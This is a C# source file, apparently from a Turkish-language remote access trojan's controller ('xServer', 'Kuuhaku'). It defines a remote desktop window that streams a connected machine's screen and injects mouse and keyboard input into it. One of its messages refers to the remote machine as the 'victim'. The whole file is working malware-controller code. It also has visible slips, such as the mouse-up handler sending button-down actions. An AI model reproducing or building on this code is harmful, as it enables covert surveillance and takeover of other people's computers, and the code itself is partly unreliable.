using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;
using xServer.KuuhakuCekirdek.Yardımcılar;
using xServer.KuuhakuCekirdek.MouseKeyHook;
using xServer.KuuhakuCekirdek.Ağ;
using xServer.KuuhakuCekirdek.Paketler.ServerPaketleri;
using xServer.KuuhakuCekirdek.UTIlityler;
using xServer.Properties;    
using FareEylemleri = xServer.Enumlar2.FareEylemleri;

namespace xServer.Formlar
{
    public partial class FrmUzakMasaüstü : Form
    {
        private readonly Client _connectClient;
        private bool _enableKeyboardInput;
        private bool _enableMouseInput;
        private KlavyeFareEylemleri _keyboardHook;
        private List<Keys> _keysPressed;
        private KlavyeFareEylemleri _mouseHook;

        public FrmUzakMasaüstü(Client c)
        {
            _connectClient = c;
            _connectClient.Value.FrmRdp = this;

            SubscribeEvents();
            InitializeComponent();
        }

        public bool IsStarted { get; private set; }

        private void FrmRemoteDesktop_Load(object sender, EventArgs e)
        {
            Text = PencereYardımcısı.GetWindowTitle("Uzak Masaüstü", _connectClient);

            panelTop.Left = (Width/2) - (panelTop.Width/2);

            btnHide.Left = (panelTop.Width/2) - (btnHide.Width/2);

            btnShow.Location = new Point(377, 0);
            btnShow.Left = (Width/2) - (btnShow.Width/2);

            _keysPressed = new List<Keys>();

            if (_connectClient.Value != null)
                new GetMonitors().Execute(_connectClient);
        }

        private void SubscribeEvents()
        {
            if (PlatformYardımcısı.MonodaÇalışıyor)
            {
                KeyDown += OnKeyDown;
                KeyUp += OnKeyUp;
            }
            else
            {
                _keyboardHook = AnaHook.GlobalEvents();
                _keyboardHook.KeyDown += OnKeyDown;
                _keyboardHook.KeyUp += OnKeyUp;

                _mouseHook = AnaHook.AppEvents();
                _mouseHook.MouseWheel += OnMouseWheelMove;
            }
        }

        private void UnsubscribeEvents()
        {
            if (PlatformYardımcısı.MonodaÇalışıyor)
            {
                KeyDown -= OnKeyDown;
                KeyUp -= OnKeyUp;
            }
            else
            {
                if (_keyboardHook != null)
                {
                    _keyboardHook.KeyDown -= OnKeyDown;
                    _keyboardHook.KeyUp -= OnKeyUp;
                    _keyboardHook.Dispose();
                }
                if (_mouseHook != null)
                {
                    _mouseHook.MouseWheel -= OnMouseWheelMove;
                    _mouseHook.Dispose();
                }
            }
        }

        public void AddMonitors(int monitors)
        {
            try
            {
                cbMonitors.Invoke((MethodInvoker) delegate
                {
                    for (int i = 0; i < monitors; i++)
                        cbMonitors.Items.Add(string.Format("Ekran {0}", i + 1));
                    cbMonitors.SelectedIndex = 0;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void UpdateImage(Bitmap bmp, bool cloneBitmap = false)
        {
            picDesktop.UpdateImage(bmp, cloneBitmap);
        }

        private void _frameCounter_FrameUpdated(FrameUpdatedEventArgs e)
        {
            try
            {
                Invoke(
                    (MethodInvoker)
                        delegate
                        {
                            this.Text = string.Format("{0} - FPS: {1}",
                                PencereYardımcısı.GetWindowTitle("Uzak Masaüstü", _connectClient),
                                e.CurrentFramesPerSecond.ToString("0.00"));
                        });
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void ToggleControls(bool t)
        {
            IsStarted = !t;
            try
            {
                Invoke((MethodInvoker) delegate
                {
                    btnStart.Enabled = t;
                    btnStop.Enabled = !t;
                    barQuality.Enabled = t;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void FrmRemoteDesktop_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (!picDesktop.IsDisposed && !picDesktop.Disposing)
                picDesktop.Dispose();
            if (_connectClient.Value != null)
                _connectClient.Value.FrmRdp = null;

            UnsubscribeEvents();
        }

        private void FrmRemoteDesktop_Resize(object sender, EventArgs e)
        {
            panelTop.Left = (Width/2) - (panelTop.Width/2);
            btnShow.Left = (Width/2) - (btnShow.Width/2);
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            if (cbMonitors.Items.Count == 0)
            {
                MessageBox.Show(
                    "Hiçbir ekran tespit edilemedi..\nLütfen kurbandan ekran verisi çekilene kadar bekleyiniz.",
                    "Başlatma başarısız.", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            ToggleControls(false);

            picDesktop.Start();

            picDesktop.SetFrameUpdatedEvent(_frameCounter_FrameUpdated);

            ActiveControl = picDesktop;

            new GetDesktop(barQuality.Value, cbMonitors.SelectedIndex).Execute(_connectClient);
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            ToggleControls(true);

            picDesktop.Stop();

            picDesktop.UnsetFrameUpdatedEvent(_frameCounter_FrameUpdated);

            ActiveControl = picDesktop;
        }

        private void barQuality_Scroll(object sender, EventArgs e)
        {
            int value = barQuality.Value;
            lblQualityShow.Text = value.ToString();

            if (value < 25)
                lblQualityShow.Text += " (düşük)";
            else if (value >= 85)
                lblQualityShow.Text += " (en iyi)";
            else if (value >= 75)
                lblQualityShow.Text += " (yüksek)";
            else if (value >= 25)
                lblQualityShow.Text += " (orta)";

            ActiveControl = picDesktop;
        }

        private void btnMouse_Click(object sender, EventArgs e)
        {
            if (_enableMouseInput)
            {
                picDesktop.Cursor = Cursors.Default;
                btnMouse.Image = Resources.mouse_delete;
                toolTipButtons.SetToolTip(btnMouse, "Mouse Girişini Aktifleştir.");
                _enableMouseInput = false;
            }
            else
            {
                picDesktop.Cursor = Cursors.Hand;
                btnMouse.Image = Resources.mouse_add;
                toolTipButtons.SetToolTip(btnMouse, "Mouse Girişini Kapat.");
                _enableMouseInput = true;
            }

            ActiveControl = picDesktop;
        }

        private void btnKeyboard_Click(object sender, EventArgs e)
        {
            if (_enableKeyboardInput)
            {
                picDesktop.Cursor = Cursors.Default;
                btnKeyboard.Image = Resources.keyboard_delete;
                toolTipButtons.SetToolTip(btnKeyboard, "Klavye Girişini Aktifleştir.");
                _enableKeyboardInput = false;
            }
            else
            {
                picDesktop.Cursor = Cursors.Hand;
                btnKeyboard.Image = Resources.keyboard_add;
                toolTipButtons.SetToolTip(btnKeyboard, "Mouse Girişini Kapat.");
                _enableKeyboardInput = true;
            }

            ActiveControl = picDesktop;
        }

        private int GetRemoteWidth(int localX)
        {
            return localX*picDesktop.ScreenWidth/picDesktop.Width;
        }

        private int GetRemoteHeight(int localY)
        {
            return localY*picDesktop.ScreenHeight/picDesktop.Height;
        }

        private void picDesktop_MouseDown(object sender, MouseEventArgs e)
        {
            if (picDesktop.Image != null && _enableMouseInput && IsStarted && ContainsFocus)
            {
                int local_x = e.X;
                int local_y = e.Y;

                int remote_x = GetRemoteWidth(local_x);
                int remote_y = GetRemoteHeight(local_y);

                FareEylemleri action = FareEylemleri.Hiçbirşey;;

                if (e.Button == MouseButtons.Left)
                    action = FareEylemleri.SolAşağı;
                if (e.Button == MouseButtons.Right)
                    action = FareEylemleri.SağAşağı;

                int selectedMonitorIndex = cbMonitors.SelectedIndex;

                if (_connectClient != null)
                    new DoMouseEvent(action, true, remote_x, remote_y, selectedMonitorIndex).Execute(_connectClient);
            }
        }

        private void picDesktop_MouseUp(object sender, MouseEventArgs e)
        {
            if (picDesktop.Image != null && _enableMouseInput && IsStarted && ContainsFocus)
            {
                int local_x = e.X;
                int local_y = e.Y;

                int remote_x = GetRemoteWidth(local_x);
                int remote_y = GetRemoteHeight(local_y);

                FareEylemleri action = FareEylemleri.Hiçbirşey; ; ;
                if (e.Button == MouseButtons.Left)
                    action = FareEylemleri.SolAşağı;;
                if (e.Button == MouseButtons.Right)
                    action = FareEylemleri.SağAşağı;

                var selectedMonitorIndex = cbMonitors.SelectedIndex;

                if (_connectClient != null)
                    new DoMouseEvent(action, false, remote_x, remote_y, selectedMonitorIndex).Execute(_connectClient);
            }
        }

        private void picDesktop_MouseMove(object sender, MouseEventArgs e)
        {
            if (picDesktop.Image != null && _enableMouseInput && IsStarted && ContainsFocus)
            {
                int local_x = e.X;
                int local_y = e.Y;

                int remote_x = GetRemoteWidth(local_x);
                int remote_y = GetRemoteHeight(local_y);

                int selectedMonitorIndex = cbMonitors.SelectedIndex;

                if (_connectClient != null)
                    new DoMouseEvent(FareEylemleri.İmleçOynat, false, remote_x, remote_y, selectedMonitorIndex).Execute(
                        _connectClient);
            }
        }

        private void OnMouseWheelMove(object sender, MouseEventArgs e)
        {
            if (picDesktop.Image != null && _enableMouseInput && IsStarted && ContainsFocus)
            {
                if (_connectClient != null)
                    new DoMouseEvent(e.Delta == 120 ? FareEylemleri.YukarıKaydır : FareEylemleri.AşağıKaydır, false,
                        0, 0, cbMonitors.SelectedIndex).Execute(_connectClient);
            }
        }

        private void OnKeyDown(object sender, KeyEventArgs e)
        {
            if (picDesktop.Image != null && _enableKeyboardInput && IsStarted && ContainsFocus)
            {
                if (!IsLockKey(e.KeyCode))
                    e.Handled = true;

                if (_keysPressed.Contains(e.KeyCode))
                    return;

                _keysPressed.Add(e.KeyCode);

                if (_connectClient != null)
                    new DoKeyboardEvent((byte) e.KeyCode, true).Execute(_connectClient);
            }
        }

        private void OnKeyUp(object sender, KeyEventArgs e)
        {
            if (picDesktop.Image != null && _enableKeyboardInput && IsStarted && ContainsFocus)
            {
                if (!IsLockKey(e.KeyCode))
                    e.Handled = true;

                _keysPressed.Remove(e.KeyCode);

                if (_connectClient != null)
                    new DoKeyboardEvent((byte) e.KeyCode, false).Execute(_connectClient);
            }
        }

        private bool IsLockKey(Keys key)
        {
            return ((key & Keys.CapsLock) == Keys.CapsLock)
                   || ((key & Keys.NumLock) == Keys.NumLock)
                   || ((key & Keys.Scroll) == Keys.Scroll);
        }

        private void btnHide_Click(object sender, EventArgs e)
        {
            panelTop.Visible = false;
            btnShow.Visible = true;
            btnHide.Visible = false;
            ActiveControl = picDesktop;
        }

        private void btnShow_Click(object sender, EventArgs e)
        {
            panelTop.Visible = true;
            btnShow.Visible = false;
            btnHide.Visible = true;
            ActiveControl = picDesktop;
        }

        private void picDesktop_Click(object sender, EventArgs e)
        {
        }
    }
}